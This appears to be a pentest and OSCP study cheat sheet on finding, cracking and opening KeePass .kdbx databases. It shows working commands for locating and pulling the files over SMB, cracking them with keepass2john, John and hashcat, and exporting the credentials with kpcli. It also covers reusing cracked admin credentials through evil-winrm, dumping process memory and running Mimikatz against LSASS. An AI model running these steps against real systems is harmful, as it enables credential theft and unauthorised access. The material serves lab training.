# KeePass Password Manager

tags: #Passwords #KeePass #Password_Cracking #Foundational

resources: [KeePass Official](https://keepass.info/), [keepass2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/keepass2john.py)

> [!info] KeePass is a password manager that stores credentials in encrypted database files (.kdbx). If you find these files during enumeration, you can crack them to obtain stored passwords.

## Finding KDBX Files

### Windows Discovery

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```cmd
dir /s /b *.kdbx
```

### Linux Discovery

```bash
find / -name "*.kdbx" 2>/dev/null
```

### Common Locations

```plaintext
# Windows
C:\Users\<Username>\Documents\Database.kdbx
C:\Users\<Username>\Desktop\passwords.kdbx
C:\Users\<Username>\Downloads\keepass.kdbx
C:\Program Files\KeePass\Database.kdbx

# Linux
/home/<username>/Documents/Database.kdbx
/home/<username>/.keepass/Database.kdbx
/opt/keepass/Database.kdbx
```

### SMB Share Discovery

```bash
# List shares
smbclient -L //<TargetIP>

# Connect to share
smbclient //<TargetIP>/Users -U <Username>

# Search for KDBX files
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *.kdbx
```

## Extracting Hash with keepass2john

### Basic Usage

```bash
keepass2john Database.kdbx > keepass.hash
```

### Example Output

```plaintext
Database:$keepass$*2*60000*0*d74e4a5...
```

> [!info] The hash format includes the KeePass version, iteration count, and encrypted data.

### Multiple Files

```bash
# Process multiple KDBX files
for file in *.kdbx; do
    keepass2john "$file" >> all_keepass.hash
done
```

## Cracking with John the Ripper

### Basic Cracking

```bash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### With Rules

```bash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=rockyou-30000
```

### Show Cracked Passwords

```bash
john keepass.hash --show
```

### Example Output

```plaintext
Database.kdbx:welcome

1 password hash cracked, 0 left
```

## Cracking with Hashcat

### Identify Hash Mode

```bash
hashcat --help | grep -i "keepass"
```

> [!info] KeePass mode: 13400

### Basic Cracking

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

### With Rules

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

### Force on VM

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force
```

### Show Cracked Passwords

```bash
hashcat -m 13400 keepass.hash --show
```

## Opening KeePass Database with kpcli

### Installation

```bash
sudo apt install kpcli
```

### Opening Database

```bash
kpcli --kdb=Database.kdbx
```

> [!info] You'll be prompted for the master password (the one you cracked).

### Example Session

```bash
kpcli --kdb=Database.kdbx
# Enter password: welcome

kpcli:/> ls
=== Groups ===
Internet/
Email/
Databases/
Windows/

kpcli:/> cd Databases

kpcli:/Databases> ls
=== Entries ===
0. MySQL Production
1. PostgreSQL Dev
2. MSSQL Server

kpcli:/Databases> show 0

Title: MySQL Production
UserName: root
Password: SuperSecretPass123!
URL: mysql://10.10.10.5:3306
Notes: Production database credentials
```

### Common kpcli Commands

```bash
# List groups and entries
ls

# Change directory
cd <GroupName>

# Show entry details
show <EntryNumber>

# Show entry with hidden password visible
show -f <EntryNumber>

# Search for entries
find <SearchTerm>

# Export database
export <filename>

# Help
help

# Exit
quit
```

## Opening with KeePassXC (GUI)

### Installation

```bash
sudo apt install keepassxc
```

### Opening Database

```bash
keepassxc Database.kdbx
```

> [!tip] Enter the cracked master password when prompted.

### Exporting Credentials

1. Open database with master password
2. File → Export → CSV
3. Save exported credentials

## Complete Workflow Example

### Step 1: Find KDBX File

```bash
# During SMB enumeration
smbclient //<TargetIP>/Users -U <Username>
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *.kdbx
```

### Step 2: Extract Hash

```bash
keepass2john Database.kdbx > keepass.hash
```

### Step 3: Crack Password

```bash
# Try with John first
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt

# If John is slow, use Hashcat
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force
```

### Step 4: View Cracked Password

```bash
john keepass.hash --show
# Output: Database.kdbx:welcome
```

### Step 5: Open Database

```bash
kpcli --kdb=Database.kdbx
# Password: welcome

kpcli:/> ls
kpcli:/> cd Windows
kpcli:/Windows> ls
kpcli:/Windows> show 0
```

### Step 6: Extract Credentials

```plaintext
Title: Domain Admin
UserName: administrator
Password: P@ssw0rd123!
URL: 
Notes: Domain administrator account
```

### Step 7: Use Credentials

```bash
# Try the found credentials
evil-winrm -i <TargetIP> -u administrator -p 'P@ssw0rd123!'
```

## Advanced Techniques

### Brute Force with Custom Wordlist

```bash
# Create custom wordlist based on company name
cat > custom.txt << EOF
CompanyName123
CompanyName2024
CompanyName!
Welcome123
Password123
EOF

# Crack with custom list
john keepass.hash --wordlist=custom.txt
```

### Mask Attack with Hashcat

```bash
# Pattern: 8 lowercase letters
hashcat -m 13400 keepass.hash -a 3 ?l?l?l?l?l?l?l?l

# Pattern: Capital + 6 lowercase + 2 digits
hashcat -m 13400 keepass.hash -a 3 ?u?l?l?l?l?l?l?d?d

# Pattern: Word + year
hashcat -m 13400 keepass.hash -a 6 wordlist.txt ?d?d?d?d
```

### Incremental Mode

```bash
john keepass.hash --incremental
```

## Troubleshooting

### keepass2john Not Found

```bash
# Locate the script
locate keepass2john

# Run directly
python3 /usr/share/john/keepass2john.py Database.kdbx > keepass.hash
```

### Invalid Hash Format

> [!warning] Ensure the hash file only contains the hash, not the filename.

```bash
# Remove filename from hash
sed 's/^[^:]*://' keepass.hash > keepass_clean.hash
```

### Hashcat Not Working on VM

```bash
# Use --force flag
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force
```

### kpcli Can't Open Database

> [!tip] Ensure you're using the correct master password.

```bash
# Verify cracked password
john keepass.hash --show

# Try opening with exact password
kpcli --kdb=Database.kdbx
```

## Alternative: KeePass Memory Dump

### If KeePass is Running

> [!info] If KeePass is running on the target, you can dump the master password from memory.

```bash
# Find KeePass process
ps aux | grep -i keepass

# Dump process memory (requires root)
sudo gcore <PID>

# Search for master password in dump
strings core.<PID> | grep -i password
```

### Windows Memory Dump

```powershell
# Using Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```

## Security Considerations

> [!important] KeePass databases found during pentests often contain:
> - Domain administrator credentials
> - Service account passwords
> - Database credentials
> - SSH keys and certificates
> - API keys and tokens

> [!tip] Always check KeePass databases thoroughly - they're a goldmine of credentials!

## Common Master Passwords

```plaintext
# Try these common passwords first
password
password1
Password1
admin
master
keepass
database
welcome
Welcome1
P@ssw0rd
```

## OSCP Exam Tips

> [!warning] In OSCP labs/exam:
> - KDBX files are often intentionally placed
> - Master password is usually in rockyou.txt
> - Don't spend too long on complex cracking
> - Check for password hints in file names or notes

> [!tip] Quick workflow:
> 1. Find KDBX file (2 minutes)
> 2. Extract hash (30 seconds)
> 3. Crack with rockyou.txt (5-10 minutes)
> 4. Open with kpcli (1 minute)
> 5. Extract all credentials (2 minutes)
> 6. Test credentials everywhere (ongoing)
